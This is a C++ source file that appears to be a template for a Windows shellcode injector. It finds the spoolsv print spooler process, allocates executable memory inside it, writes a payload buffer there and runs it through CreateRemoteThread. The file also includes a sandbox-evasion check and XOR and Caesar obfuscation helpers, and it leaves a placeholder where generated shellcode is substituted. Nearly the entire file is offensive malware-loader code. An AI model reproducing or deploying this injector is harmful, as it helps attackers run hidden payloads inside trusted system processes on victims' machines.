#include <Windows.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <tlhelp32.h>
#include <iostream>

FARPROC getHandler(HMODULE module, std::string procName) {
    return GetProcAddress(module, procName.c_str());
}

FARPROC getHandler(std::wstring module, std::string procName) {
    return GetProcAddress(LoadLibraryW(module.c_str()), procName.c_str());
}

inline uint8_t _xor(uint8_t orig, uint8_t* key, uint8_t keyl) {
    return ([&]()->uint8_t {
        for (int i = 0; i < keyl; i++) { orig ^= key[i]; } return orig; }()) & 0xFF;
}

inline uint8_t _ceasar(uint8_t orig, uint8_t shift) {
    return ((orig + shift) & 0xFF);
}


int main(int argc, wchar_t **argv)
{
    LPVOID duleziteBlbec = VirtualAllocExNuma(GetCurrentProcess(), nullptr, 0x1000, 0x3000, 0x4, 0);
    if (!duleziteBlbec) {
        return 0;
    }       
    
    if (argc < 2) {
        std::wcerr << "[!] Naval process co chces zborat" << std::endl;
        return 0;
    }
    DWORD pid{ 0 };
    /**********/
    HANDLE pSnapShooter = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (pSnapShooter == INVALID_HANDLE_VALUE) {
        std::wcerr << "[!] CreateToolhelp32Snapshot failed" << std::endl;
        return -1;
    }
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(pSnapShooter, &pe32)) {
        std::wcerr << "[!] Process32First" << std::endl;
        return -1;
    }
    
    do {
        std::wstring procName = pe32.szExeFile;
        if (procName.find(L"spoolsv") != std::wstring::npos) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(pSnapShooter, &pe32));
    CloseHandle(pSnapShooter);
    if (pid == 0) {
        std::wcerr << "[!] PID == 0? Nepredpokladam ze je to ok" << std::endl;
        return -1;
    }
    std::wcerr << "[*] Close impact" << std::endl;
    /**********/    
    {SHELLCODE_TO_REPLACE}

    std::wcerr << "[i] Want to spawn spoolsv PID: " << pid << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess) {
        std::wcerr << "[i] Opened process handle" << std::endl;
        LPVOID zakernaAdresa = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (zakernaAdresa) {
            SIZE_T zapsanechBajtu{ 0 };
            if (WriteProcessMemory(hProcess, zakernaAdresa, buf.get(), bufsz, &zapsanechBajtu)) {
                HANDLE procesRemVlakno = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)zakernaAdresa, nullptr, 0, nullptr);
                if (procesRemVlakno != INVALID_HANDLE_VALUE) {
                    std::wcerr << "[i] Created remote thread " << std::endl;
                    //WaitForSingleObject(procesRemVlakno, -1);
                }
                else
                    std::wcerr << "[!] CreateRemoteThread " << GetLastError() << std::endl;
            }
            else
                std::wcerr << "[!] WriteProcessMemory " << GetLastError() << std::endl;
        }
        else
            std::wcerr << "[!] VirtualAllocEx " << GetLastError() << std::endl;
    }
    else
        std::wcerr << "[!] OpenProcess " << GetLastError() << std::endl;
}
